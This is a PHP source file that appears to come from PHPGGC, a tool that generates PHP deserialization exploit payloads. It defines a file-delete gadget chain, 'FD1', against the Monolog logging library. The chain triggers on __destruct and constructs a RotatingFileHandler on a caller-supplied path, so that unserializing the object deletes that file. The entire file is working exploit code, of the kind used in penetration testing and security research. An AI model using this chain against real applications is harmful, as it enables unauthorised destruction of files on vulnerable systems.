<?php

namespace GadgetChain\Monolog;

class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '*';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $file = $parameters['remote_path'];

        return new \Monolog\Handler\RotatingFileHandler($file);
    }
}